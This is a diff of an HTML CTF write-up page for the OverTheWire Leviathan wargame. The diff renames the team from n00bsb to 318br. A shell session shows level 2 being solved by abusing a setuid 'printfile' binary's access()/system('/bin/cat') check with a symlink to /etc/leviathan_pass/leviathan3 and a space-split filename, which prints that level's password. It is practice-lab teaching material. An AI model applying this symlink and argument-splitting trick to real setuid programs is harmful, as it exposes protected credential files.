@@ -4,11 +4,11 @@
     <meta charset="utf-8">
     <title>Write-Up - OverTheWire - Leviathan</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="n00bsb Brazilian ctf-team">
-    <meta name="author" content="n00bsbot">
+    <meta name="description" content="318BR Brazilian CTF-Team">
+    <meta name="author" content="318bot">
 
     <!-- Styles -->
-    <link rel="stylesheet" href="../../theme/css/n00bsb.css" type="text/css" />
+    <link rel="stylesheet" href="../../theme/css/318br.css" type="text/css" />
 <!--    <link href="../../theme/css/pygments.css" rel="stylesheet">  -->
     <link href='https://fonts.googleapis.com/css?family=Inconsolata' rel='stylesheet' type='text/css'>
 
@@ -144,19 +144,19 @@ printfile: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dyn
 leviathan2@melinda:~$ ./printfile 
 *** File Printer ***
 Usage: ./printfile filename
-leviathan2@melinda:~$ touch /tmp/n00bsbfile
-leviathan2@melinda:~$ ltrace ./printfile /tmp/n00bsbfile
+leviathan2@melinda:~$ touch /tmp/318brfile
+leviathan2@melinda:~$ ltrace ./printfile /tmp/318brfile
 __libc_start_main(0x804852d, 2, 0xffffd654, 0x8048600 &lt;unfinished ...&gt;
-access(&quot;/tmp/n00bsbfile&quot;, 4)                                                                                              = 0
-snprintf(&quot;/bin/cat /tmp/n00bsbfile&quot;, 511, &quot;/bin/cat %s&quot;, &quot;/tmp/n00bsbfile&quot;)                                               = 24
-system(&quot;/bin/cat /tmp/n00bsbfile&quot; &lt;no return ...&gt;
+access(&quot;/tmp/318brfile&quot;, 4)                                                                                              = 0
+snprintf(&quot;/bin/cat /tmp/318brfile&quot;, 511, &quot;/bin/cat %s&quot;, &quot;/tmp/318brfile&quot;)                                               = 24
+system(&quot;/bin/cat /tmp/318brfile&quot; &lt;no return ...&gt;
 --- SIGCHLD (Child exited) ---
 &lt;... system resumed&gt; )                                                                                                    = 0
 +++ exited (status 0) +++
-leviathan2@melinda:~$ rm /tmp/n00bsbfile
-leviathan2@melinda:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/n00bsbfile
-leviathan2@melinda:~$ touch /tmp/n00bsbfile\ blabla
-leviathan2@melinda:~$ ./printfile /tmp/n00bsbfile\ blabla
+leviathan2@melinda:~$ rm /tmp/318brfile
+leviathan2@melinda:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/318brfile
+leviathan2@melinda:~$ touch /tmp/318brfile\ blabla
+leviathan2@melinda:~$ ./printfile /tmp/318brfile\ blabla
 Ahdiemoo1j
 /bin/cat: blabla: No such file or directory
 </pre></div>
@@ -277,18 +277,18 @@ Well Done, you seem to have used a *nix system before, now try something more se
 <li class="nav-header"><h4>Links</h4></li>
     <li><a target="_blank" href="https://asciinema.org/~fallc0nn">Asciinema (fallc0nn)</a></li>
     <li><a target="_blank" href="https://ctftime.org/team/24500">CTF-Time</a></li>
-    <li><a target="_blank" href="https://github.com/n00bsb">Github</a></li>
+    <li><a target="_blank" href="https://github.com/318br">Github</a></li>
 
 <li class="nav-header"><h4>Categorias</h4></li>
 <li><a href="../../category/ctf.html">CTF</a></li>
 <li><a href="../../category/wargames.html">Wargames</a></li>
 
 <li class="nav-header"><h4></i>Tags</h4></li>
-<li class="tag-[<pelican.contents.Article object at 0x10fe447d0>]"><a href="../../tag/ctf.html">#ctf</a></li>
-<li class="tag-[<pelican.contents.Article object at 0x110d608d0>, <pelican.contents.Article object at 0x110d2abd0>]"><a href="../../tag/overthewireorg.html">#overthewire.org</a></li>
-<li class="tag-[<pelican.contents.Article object at 0x10fe447d0>]"><a href="../../tag/sctf.html">#sctf</a></li>
-<li class="tag-[<pelican.contents.Article object at 0x110d608d0>, <pelican.contents.Article object at 0x110d2abd0>]"><a href="../../tag/wargames.html">#wargames</a></li>
-<li class="tag-[<pelican.contents.Article object at 0x10fe447d0>, <pelican.contents.Article object at 0x110d608d0>, <pelican.contents.Article object at 0x110d2abd0>]"><a href="../../tag/write-up.html">#write-up</a></li>
+<li class="tag-[<pelican.contents.Article object at 0x105fd27d0>]"><a href="../../tag/ctf.html">#ctf</a></li>
+<li class="tag-[<pelican.contents.Article object at 0x106ef18d0>, <pelican.contents.Article object at 0x106ebcbd0>]"><a href="../../tag/overthewireorg.html">#overthewire.org</a></li>
+<li class="tag-[<pelican.contents.Article object at 0x105fd27d0>]"><a href="../../tag/sctf.html">#sctf</a></li>
+<li class="tag-[<pelican.contents.Article object at 0x106ef18d0>, <pelican.contents.Article object at 0x106ebcbd0>]"><a href="../../tag/wargames.html">#wargames</a></li>
+<li class="tag-[<pelican.contents.Article object at 0x105fd27d0>, <pelican.contents.Article object at 0x106ef18d0>, <pelican.contents.Article object at 0x106ebcbd0>]"><a href="../../tag/write-up.html">#write-up</a></li>
 
 </ul>        </div><!--/.well -->
       </div><!--/row-->
